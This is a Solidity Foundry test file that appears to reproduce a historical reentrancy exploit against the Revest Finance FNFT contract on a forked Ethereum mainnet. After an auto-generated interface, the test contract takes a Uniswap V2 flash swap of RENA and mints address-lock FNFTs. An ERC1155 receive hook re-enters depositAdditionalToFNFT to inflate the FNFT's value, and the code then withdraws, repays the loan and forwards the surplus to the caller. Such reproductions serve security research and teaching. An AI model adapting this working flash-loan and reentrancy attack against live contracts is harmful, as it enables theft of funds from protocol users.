// SPDX-License-Identifier: UNLICENSED
// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!
pragma solidity >=0.7.0 <0.9.0;

import "forge-std/Test.sol";
import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";

import {IERC20} from "src/interfaces/IERC20.sol";

interface IRevest {

    struct FNFTConfig {
        address asset;
        address pipeToContract;
        uint256 depositAmount;
        uint256 depositMul;
        uint256 split;
        uint256 depositStopTime;
        bool maturityExtension;
        bool isMulti;
        bool nontransferrable;
    }

    event FNFTAddionalDeposited(
        address indexed from, uint256 indexed newFNFTId, uint256 indexed quantity, uint256 amount
    );
    event FNFTAddressLockMinted(
        address indexed asset,
        address indexed from,
        uint256 indexed fnftId,
        address trigger,
        uint256[] quantities,
        FNFTConfig fnftConfig
    );
    event FNFTMaturityExtended(address indexed from, uint256 indexed fnftId, uint256 indexed newExtendedTime);
    event FNFTSplit(address indexed from, uint256[] indexed newFNFTId, uint256[] indexed proportions, uint256 quantity);
    event FNFTTimeLockMinted(
        address indexed asset,
        address indexed from,
        uint256 indexed fnftId,
        uint256 endTime,
        uint256[] quantities,
        FNFTConfig fnftConfig
    );
    event FNFTUnlocked(address indexed from, uint256 indexed fnftId);
    event FNFTValueLockMinted(
        address indexed primaryAsset,
        address indexed from,
        uint256 indexed fnftId,
        address compareTo,
        address oracleDispatch,
        uint256[] quantities,
        FNFTConfig fnftConfig
    );
    event FNFTWithdrawn(address indexed from, uint256 indexed fnftId, uint256 indexed quantity);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event RoleAdminChanged(bytes32 indexed role, bytes32 indexed previousAdminRole, bytes32 indexed newAdminRole);
    event RoleGranted(bytes32 indexed role, address indexed account, address indexed sender);
    event RoleRevoked(bytes32 indexed role, address indexed account, address indexed sender);

    function ADDRESS_LOCK_INTERFACE_ID() external view returns (bytes4);

    function DEFAULT_ADMIN_ROLE() external view returns (bytes32);

    function PAUSER_ROLE() external view returns (bytes32);

    function depositAdditionalToFNFT(uint256 fnftId, uint256 amount, uint256 quantity) external returns (uint256);

    function erc20Fee() external view returns (uint256);

    function extendFNFTMaturity(uint256 fnftId, uint256 endTime) external returns (uint256);

    function flatWeiFee() external view returns (uint256);

    function getAddressesProvider() external view returns (address);

    function getERC20Fee() external view returns (uint256);

    function getFlatWeiFee() external view returns (uint256);

    function getRoleAdmin(bytes32 role) external view returns (bytes32);

    function getRoleMember(bytes32 role, uint256 index) external view returns (address);

    function getRoleMemberCount(bytes32 role) external view returns (uint256);

    function grantRole(bytes32 role, address account) external;

    function hasRole(bytes32 role, address account) external view returns (bool);

    function mintAddressLock(
        address trigger,
        bytes memory arguments,
        address[] memory recipients,
        uint256[] memory quantities,
        FNFTConfig memory fnftConfig
    ) external payable returns (uint256);

    function mintTimeLock(
        uint256 endTime,
        address[] memory recipients,
        uint256[] memory quantities,
        FNFTConfig memory fnftConfig
    ) external payable returns (uint256);

    function mintValueLock(
        address primaryAsset,
        address compareTo,
        uint256 unlockValue,
        bool unlockRisingEdge,
        address oracleDispatch,
        address[] memory recipients,
        uint256[] memory quantities,
        FNFTConfig memory fnftConfig
    ) external payable returns (uint256);

    function owner() external view returns (address);

    function renounceOwnership() external;

    function renounceRole(bytes32 role, address account) external;

    function revokeRole(bytes32 role, address account) external;

    function setAddressRegistry(address registry) external;

    function setERC20Fee(uint256 erc20) external;

    function setFlatWeiFee(uint256 wethFee) external;

    function splitFNFT(uint256 fnftId, uint256[] memory proportions, uint256 quantity)
        external
        returns (uint256[] memory);

    function supportsInterface(bytes4 interfaceId) external view returns (bool);

    function transferOwnership(address newOwner) external;

    function unlockFNFT(uint256 fnftId) external;

    function withdrawFNFT(uint256 fnftId, uint256 quantity) external;

}

contract ContractTest is Test {

    IUniswapV2Pair pair = IUniswapV2Pair(0xbC2C5392b0B841832bEC8b9C30747BADdA7b70ca);
    IERC20 rena = IERC20(0x56de8BC61346321D4F2211e3aC3c0A7F00dB9b76);
    IRevest revest = IRevest(0x2320A28f52334d62622cc2EaFa15DE55F9987eD9);
    uint256 fnftId;
    bool reentered = false;

    function setUp() public {
        vm.createSelectFork("mainnet", 14_465_356); //fork mainnet at 14465356
    }

    function testExploit() public {
        emit log_named_uint("Before exploit, Rena balance of attacker:", rena.balanceOf(msg.sender));
        pair.swap(5 * 1e18, 0, address(this), new bytes(1));
        emit log_named_uint("After exploit, Rena balance of attacker:", rena.balanceOf(msg.sender));
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        rena.approve(address(revest), type(uint256).max);
        IRevest.FNFTConfig memory fnftConfig;
        fnftConfig.asset = address(rena);
        fnftConfig.pipeToContract = 0x0000000000000000000000000000000000000000;
        fnftConfig.depositAmount = 0;
        fnftConfig.depositMul = 0;
        fnftConfig.split = 0;
        fnftConfig.depositStopTime = 0;
        fnftConfig.maturityExtension = false;
        fnftConfig.isMulti = true;
        fnftConfig.nontransferrable = false;

        address[] memory recipients = new address[](1);
        uint256[] memory quantities = new uint256[](1);
        recipients[0] = address(this);
        quantities[0] = uint256(2);
        fnftId = revest.mintAddressLock(address(this), new bytes(0), recipients, quantities, fnftConfig);
        quantities[0] = uint256(360_000);
        revest.mintAddressLock(address(this), new bytes(0), recipients, quantities, fnftConfig);

        revest.withdrawFNFT(fnftId + 1, 360_000 + 1);

        rena.transfer(msg.sender, ((((amount0 / 997) * 1000) / 99) * 100) + 1000);
        rena.transfer(tx.origin, rena.balanceOf(address(this)));
    }

    function onERC1155Received(address operator, address from, uint256 id, uint256 value, bytes calldata data)
        public
        returns (bytes4)
    {
        if (id == fnftId + 1 && !reentered) {
            reentered = true;
            revest.depositAdditionalToFNFT(fnftId, 1e18, 1);
        }
        return this.onERC1155Received.selector;
    }

}
